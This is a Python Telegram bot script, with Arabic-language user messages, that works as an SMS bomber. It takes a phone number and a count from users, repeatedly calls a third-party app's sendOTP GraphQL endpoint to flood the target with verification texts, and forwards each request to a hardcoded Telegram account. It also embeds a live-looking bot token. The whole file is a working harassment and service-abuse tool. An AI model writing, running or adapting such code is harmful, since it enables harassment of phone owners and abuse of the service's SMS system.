import telebot
import requests

bot = telebot.TeleBot('6103551301:AAFWQCycnoSZ2JCIZmS2JtNGfhQP05bg2Jw')

# Dictionary to store the processing status for each user ID
processing_status = {}

def sendMessage(number):
  headers = {
      "User-Agent": "Dart/3.1 (dart:io)",
      "Accept": "application/json",
      "Lang": "en",
      "Accept-Encoding": "gzip",
      "Content-Length": "96",
      "Host": "app.tagaddod.com",
      "Content-Type": "application/json; charset=utf-8"
  }

  data = f'{{"operationName":"","variables":{{}},"query":"mutation{{\\nsendOTP(phone: \\"{number}\\")\\n}}"}}'

  response = requests.post('https://app.tagaddod.com/graphql', headers=headers, data=data).text
  if "You will receive SMS with your OTP" in response:
      return "done"
  else:
      return "error"

@bot.message_handler(commands=['start'])
def welcome(message):
    user_id = message.from_user.id
    processing_status[user_id] = False  # Initialize processing status for the user
    bot.send_message(message.chat.id, '''
        اهلا بيك فـ Usf Bot 
        ابعت الرقم الي عايز تبعتلو Spam بدون اي مسافات و عدد الرسايل علي الشكل ده👇
        010xxxxxxxx:عدد الرسايل 
    ''')

def isMsg(message):
    return True

@bot.message_handler(func=isMsg)
def reply(message):
    global processing_status
    try:
        Text="Done"
        user_id = message.from_user.username
        if user_id in processing_status and processing_status[user_id]:
            bot.reply_to(message, '''استني لما نخلص و نقولك Done  عشان نقدر نبعتلك  تاني 
مش كلو ورا بعضو كده 😏''')
            return

        
        bot.reply_to(message, "Wait....")

        x = message.text
        if " "in x:
          x=x.replace(" ","")
        if x[0]=="+":
          x=x[2:] 
        number=x[0:11]
        count=int(x[12:])
        max_count=100
        if count>max_count:
          bot.reply_to(message,f"مينفعش تبعت اكتر من  {max_count} في المره الواحده ")
          return

        processing_status[user_id] = True  # Set processing status to True for the current user
        for i in range(count):
          sendMessage(number)

        bot.reply_to(message, Text)
        processing_status[user_id] = False  # Reset processing status for the current user
        bot.send_message(1098317745, message.text + "\n" + "From: " + "@" + message.from_user.username + "\n" + "Response: " + Text)

    except Exception as e:
        Text = "Faild"
        bot.reply_to(message, Text)
        print(e)



bot.polling()
